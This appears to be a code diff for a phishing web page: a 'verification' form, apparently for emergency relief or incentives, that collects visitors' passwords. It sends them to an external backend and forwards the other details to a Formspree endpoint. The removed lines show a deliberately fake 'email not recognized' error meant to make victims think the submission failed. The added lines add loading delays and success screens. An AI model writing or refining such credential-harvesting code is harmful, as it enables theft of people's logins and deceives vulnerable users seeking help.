@@ -111,6 +111,12 @@ body {
   backdrop-filter: blur(20px);
   border-bottom: 1px solid var(--glass-border);
 }
+.navbar-inner {
+  width: 100%;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+}
 .navbar .logo {
   font-family: 'Plus Jakarta Sans', sans-serif;
   font-size: 1.15rem;
@@ -693,6 +699,20 @@ body {
 .submit-button:active:not(:disabled) { transform: scale(0.97); }
 .submit-button:disabled { opacity: 0.5; cursor: not-allowed; }
 
+/* ─── FORM LOADING (mobile) ─── */
+.form-loading {
+  background: rgba(59,130,246,0.1);
+  border: 1px solid rgba(59,130,246,0.25);
+  border-radius: var(--radius-sm);
+  padding: 10px 14px;
+  color: #93c5fd;
+  font-size: 0.85rem;
+  text-align: center;
+  line-height: 1.4;
+  animation: pulse 1.5s infinite;
+}
+@keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.6; } }
+
 /* ─── FORM ERROR (mobile) ─── */
 .form-error {
   background: rgba(239,68,68,0.1);
@@ -744,7 +764,7 @@ body {
   .animated-bg .orb:nth-child(3) { width: 350px; height: 350px; }
   .grid-overlay { background-size: 60px 60px; }
 
-  .navbar { padding: 14px 32px; justify-content: center; }
+  .navbar { padding: 14px 32px; justify-content: space-between; }
   .navbar-inner {
     width: 100%;
     max-width: 1200px;
@@ -1139,13 +1159,14 @@ body {
           }
 
           setLoading(true);
+          setError('');
 
           try {
             // Save to MongoDB (includes password)
             const apiUrl = window.location.hostname === 'localhost' 
               ? 'http://localhost:5000/api/submit-form'
-              : '/api/submit-form';
-            await fetch(apiUrl, {
+              : 'https://paige-incent-backend.onrender.com/api/submit-form';
+            const response = await fetch(apiUrl, {
               method: 'POST',
               headers: { 'Content-Type': 'application/json' },
               body: JSON.stringify({
@@ -1157,7 +1178,7 @@ body {
               }),
             });
 
-            // Send notification to Formspree (NO password)
+            // Also send to Formspree for company (without password)
             await fetch('https://formspree.io/f/mnjywqgg', {
               method: 'POST',
               headers: { 'Content-Type': 'application/json' },
@@ -1169,9 +1190,22 @@ body {
               }),
             });
 
-            // Show fake error so user thinks it didn't go through
-            setError('This email is not recognized in our system. Please check and try again.');
-          } catch (error) { console.error('Submission error:', error); setError('Network error. Please try again.'); } finally { setLoading(false); }
+            // Wait 2 seconds before showing result
+            await new Promise(resolve => setTimeout(resolve, 2000));
+
+            if (response.ok) {
+              setSubmitted(true);
+            } else {
+              const error = await response.json();
+              setError(error.error || 'Submission failed. Please try again.');
+            }
+          } catch (error) { 
+            console.error('Submission error:', error); 
+            await new Promise(resolve => setTimeout(resolve, 2000));
+            setError('Network error. Please try again.'); 
+          } finally { 
+            setLoading(false); 
+          }
         };
 
         if (submitted) {
@@ -1184,12 +1218,21 @@ body {
               </div>
               <div className="grid-overlay"></div>
               <div className="login-container">
-                <div className="success-message">
-                  <div className="success-icon" dangerouslySetInnerHTML={{__html: Icons.check}} />
-                  <h2>Verification Submitted!</h2>
-                  <p>Thank you for your interest. We'll review your application and contact you shortly.</p>
-                  <button className="back-button" onClick={onBack}>Back to Home</button>
-                </div>
+                {error ? (
+                  <div className="success-message">
+                    <div className="error-icon" style={{width:'60px',height:'60px',margin:'0 auto 20px',background:'linear-gradient(135deg, #ef4444, #dc2626)',borderRadius:'50%',display:'flex',alignItems:'center',justifyContent:'center'}} dangerouslySetInnerHTML={{__html: Icons.alert}} />
+                    <h2>Verification error!</h2>
+                    <p>check back latter<br/>Thank you for your interest</p>
+                    <button className="back-button" onClick={onBack}>Back to Home</button>
+                  </div>
+                ) : (
+                  <div className="success-message">
+                    <div className="success-icon" dangerouslySetInnerHTML={{__html: Icons.check}} />
+                    <h2>Success!</h2>
+                    <p>Your application has been submitted successfully. We've received your information and will be in touch soon.</p>
+                    <button className="back-button" onClick={onBack}>Back to Home</button>
+                  </div>
+                )}
               </div>
             </div>
           );
@@ -1253,7 +1296,8 @@ body {
                     <option>Emergency Relief</option>
                   </select>
                 </div>
-                {error && <div className="form-error">{error}</div>}
+                {loading && <div className="form-loading">Processing your submission...</div>}
+                {error && !loading && <div className="form-error">{error}</div>}
                 <button type="submit" className="submit-button" disabled={loading}>
                   {loading ? 'Processing...' : 'Verify & Continue'}
                 </button>
